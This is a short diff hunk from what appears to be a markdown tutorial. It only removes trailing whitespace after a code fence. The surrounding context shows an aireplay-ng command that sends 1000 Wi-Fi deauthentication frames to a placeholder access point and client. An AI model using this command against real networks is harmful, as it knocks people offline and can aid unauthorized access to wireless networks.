@@ -28,7 +28,7 @@ Next, you need to run `aireplay-ng` in your terminal. Here is an example:
 
 ```sh
 aireplay-ng --deauth 1000 -a 00:11:22:33:44:55 -c 00:AA:BB:CC:DD:EE wlan0
-``` 
+```
 
 Let's break down the parameters:
 
